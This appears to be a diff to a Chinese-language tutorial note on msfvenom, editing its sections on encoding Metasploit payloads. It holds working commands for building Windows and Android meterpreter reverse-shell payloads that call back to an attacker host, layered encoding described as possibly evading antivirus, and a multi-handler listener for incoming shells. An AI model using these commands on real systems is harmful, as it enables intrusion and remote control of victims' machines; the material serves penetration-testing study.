@@ -292,28 +292,22 @@ msfvenom --payload linux/x86/exec --payload-options
 
 使用编码器 对payload进行编码
 
-1.规避特殊字符  
+1.使用-b参数 指定需要规避的特殊字符列表
 
-`-b '/x00一个特殊字符列表'`
-
-msf会自动找一个合适的编码器规避payload中的这些"坏字符"
-`msfvenom --payload windows/meterpreter/bind_tcp -b '\x00' -f raw`
-
+msf会"自动"找一个合适的编码器规避payload中的这些"坏字符"
 ```
+msfvenom --payload windows/meterpreter/bind_tcp -b '\x00' -f raw
+
 Found 10 compatible encoders
 Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
 ```
 
-* 不同的函数，有不同的规避字符
+* 不同的函数，规避的字符不同
   * gets函数 需要避免`/x0a`
   * scanf函数 更严格，不允许空白符
   * ...
 
-如产生一段exec的shellcode
-
-2.编码
-
-指定编码器 `-e encoderName`
+2.使用-e参数 指定编码器名称encoderName
 
 如
 ```
@@ -323,13 +317,19 @@ msfvenom --payload windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw -o 
 默认的输出格式是raw(直接输出payload的字符 含乱码)
 
 
-3.迭代编码
+3.使用-i参数 指定迭代编码的次数
 
-使用-i选项进行迭代编码(迭代编码也许会有规避杀毒软件的作用)
-
-如 3次迭代编码
+如 3次迭代编码(迭代编码也许会有规避杀毒软件的作用)
 ```
 msfvenom --payload windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3
+```
+
+4.综合使用 - 通过管道符号 依次使用"多个编码器" 对输出进行编码
+
+```
+msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
+msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \
+msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
 ```
 
 
@@ -412,16 +412,6 @@ msfvenom --payload windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.ex
 -x选项经常和-k选项一起用，它允许您从模板中将payload作为新的线程运行。但是它目前只支持较老的系统，如x86 Windows XP.
 （The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP.）
 
-### How to chain msfvenom output
-
-The old msfpayload and msfencode utilities were often chained together in order layer on multiple encodings. This is possible using msfvenom as well:
-
-```
-msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \
-msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | \
-msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe
-```
-
 
 ### 编译生成的C文件
 
@@ -479,7 +469,7 @@ msfvenom --payload osx/x64/shell_reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerP
 
 
 #android
-msfvenom --payload android/meterpreter/reverse_tcp LHOST=192.168.0.1 LPORT=4444 R > androvirus.apk
+msfvenom --payload android/meterpreter/reverse_tcp LHOST=[AttackerIP] LPORT=[AttackerPort] R > androvirus.apk
 ```
 
 
@@ -524,7 +514,7 @@ Metasploit to be in a position to receive your incoming shells.
 msfconsole -x "use exploits/multi/handler; set lhost [AttackerLocalIP]; set lport [AttackerLocalPort]; set payload windows/meterpreter/reverse_tcp; exploit"
 
 # 可接受多个反弹shell(LPORT端口会一直监听)
-msfconsole -x "use exploits/multi/handler; set [AttackerLocalIP]; set lport [AttackerLocalPort]; set payload windows/meterpreter/reverse_tcp; set ExitOnSession false; exploit -j -z"
+msfconsole -x "use exploits/multi/handler; set lhost [AttackerLocalIP]; set lport [AttackerLocalPort]; set payload windows/meterpreter/reverse_tcp; set ExitOnSession false; exploit -j -z"
 ```
 
 启动multihandler进行端口监听-多条命令
